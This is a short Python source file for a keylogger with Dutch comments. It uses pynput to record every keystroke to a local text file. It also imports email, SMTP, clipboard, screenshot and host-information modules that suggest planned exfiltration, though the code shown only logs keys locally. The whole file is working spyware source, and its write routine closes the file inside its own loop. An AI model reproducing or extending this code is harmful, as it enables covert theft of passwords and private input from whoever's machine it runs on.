# Modules
import re
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key,Listener
import time
import os
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from pathlib import Path

#Variabelen keylogger

key_log = "key_log.txt"
path_directory = Path(__file__)
path_keylog = str(path_directory).replace("main.py", "key_log.txt")
path_keylog_formatted = re.escape(str(path_keylog))
print(path_keylog_formatted)

count = 0
keys = []


#Functies keylogger

def on_press(key):
    global count, keys
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_log(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

def write_log(keys):
    with open(path_keylog, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

